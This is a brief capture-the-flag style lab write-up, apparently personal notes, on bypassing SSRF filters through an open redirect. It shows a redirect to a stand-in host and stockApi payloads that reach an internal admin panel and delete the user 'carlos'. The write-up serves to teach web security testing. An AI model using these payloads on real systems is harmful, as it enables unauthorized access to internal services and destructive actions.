

### Bypassing SSRF filters via open redirection

Now instead of fetching the URL directly we may also utilize the redirect option if one if available

`/product/nextProduct?currentProductId=6&path=http://evil-user.net`



![[ssrf_open-redirect.png]]

We can clearly see that there's a endpoint `/protuct/nextproduct` with a parameter `?path=` to redirect the site. Now let's consider whether it is vulnerable for open redirect or not

![[ssrf_open-redirect_2.png]]

This clearly proves that it has a open redirect vuln 

**exploit payload:**

`stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`


```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![[ssrf_open-redirect_3.png]]
